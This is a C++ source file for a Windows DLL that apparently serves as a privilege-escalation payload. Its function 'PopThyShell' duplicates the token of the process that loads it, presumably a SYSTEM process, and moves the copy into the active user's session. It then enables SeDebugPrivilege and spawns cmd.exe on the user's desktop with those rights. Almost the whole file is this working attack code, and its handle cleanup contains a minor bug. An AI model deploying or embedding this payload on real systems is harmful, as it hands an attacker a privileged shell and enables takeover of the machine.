#include <windows.h>
#include <Winbase.h>
#include <Wtsapi32.h>
#include <Userenv.h>
#include <malloc.h>
#include <Tlhelp32.h>

#include <iostream>
#include <fstream>

#pragma comment(lib, "Wtsapi32.lib")
#pragma comment(lib, "Userenv.lib")

#define DLL_EXPORT __declspec(dllexport)

DWORD GetActiveSessionId() {
	DWORD sessionId = 0xFFFFFFFF;
	PWTS_SESSION_INFO pSessionInfo = NULL;
	DWORD sessionCount = 0;

	if (WTSEnumerateSessionsW(NULL, 0, 1, &pSessionInfo, &sessionCount)) {
		for (DWORD i = 0; i < sessionCount; i++) {
			if (pSessionInfo[i].State == WTSActive) {
				sessionId = pSessionInfo[i].SessionId;
				break;
			}
		}
		WTSFreeMemory(pSessionInfo);
	}

	return sessionId;
}

bool PopThyShell() {
	BOOL bSuccess = FALSE;
	LPCTSTR cmdDir;
	STARTUPINFO si;

	TOKEN_PRIVILEGES tp;
	LUID luid;

	HANDLE oldToken = NULL;
	HANDLE newToken = NULL;
	HANDLE privToken = NULL;
	HANDLE hProcess = NULL;

	LPVOID pEnv = NULL;

	DWORD dwCreationFlags = NORMAL_PRIORITY_CLASS | CREATE_NEW_CONSOLE;

	ZeroMemory(&si, sizeof(si));
	si.cb = sizeof(si);
	si.lpDesktop = LPTSTR(L"Winsta0\\default");
	cmdDir = LPCTSTR(L"C:\\Windows\\");

	PROCESS_INFORMATION pi;
	ZeroMemory(&pi, sizeof(pi));

	DWORD sessionId = GetActiveSessionId();
	if (sessionId == 0xFFFFFFFF) {
		goto CLEANUP_EXIT;
	}

	if (WTSQueryUserToken(sessionId, &oldToken))
	{
		if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY
			| TOKEN_DUPLICATE | TOKEN_ASSIGN_PRIMARY | TOKEN_ADJUST_SESSIONID
			| TOKEN_READ | TOKEN_WRITE, &privToken))
		{
			goto CLEANUP_EXIT;
		}

		// Enable SeDebugPrivilege
		if (!LookupPrivilegeValue(NULL, SE_DEBUG_NAME, &luid))
		{
			goto CLEANUP_EXIT;
		}

		tp.PrivilegeCount = 1;
		tp.Privileges[0].Luid = luid;
		tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;

		// Duplicate our token to &newToken
		if (!DuplicateTokenEx(privToken, MAXIMUM_ALLOWED, NULL, SecurityIdentification, TokenPrimary, &newToken)) {
			goto CLEANUP_EXIT;
		}

		if (!SetTokenInformation(newToken, TokenSessionId, (void*)&sessionId, sizeof(DWORD)))
		{
			goto CLEANUP_EXIT;
		}

		if (!AdjustTokenPrivileges(newToken, FALSE, &tp, sizeof(TOKEN_PRIVILEGES), (PTOKEN_PRIVILEGES)NULL, NULL))
		{
			goto CLEANUP_EXIT;
		}

		if (CreateEnvironmentBlock(&pEnv, newToken, TRUE))
		{
			dwCreationFlags |= CREATE_UNICODE_ENVIRONMENT;
		}

		// Create process for user with desktop
		if (!CreateProcessAsUserW(newToken, L"C:\\Windows\\System32\\cmd.exe",
			NULL, NULL, NULL, FALSE, dwCreationFlags, pEnv, L"C:\\Windows\\System32\\", &si, &pi)) {
			goto CLEANUP_EXIT;
		}

		bSuccess = TRUE;
	}

CLEANUP_EXIT:
	if (oldToken != NULL)
		CloseHandle(oldToken);
	if (newToken != NULL)
		CloseHandle(newToken);
	if (privToken != NULL)
		CloseHandle(privToken);
	if (pi.hProcess != NULL)
		CloseHandle(pi.hProcess);
	if (pi.hProcess != NULL)
		CloseHandle(pi.hThread);
	if (pEnv != NULL)
		DestroyEnvironmentBlock(pEnv);
	return bSuccess;
}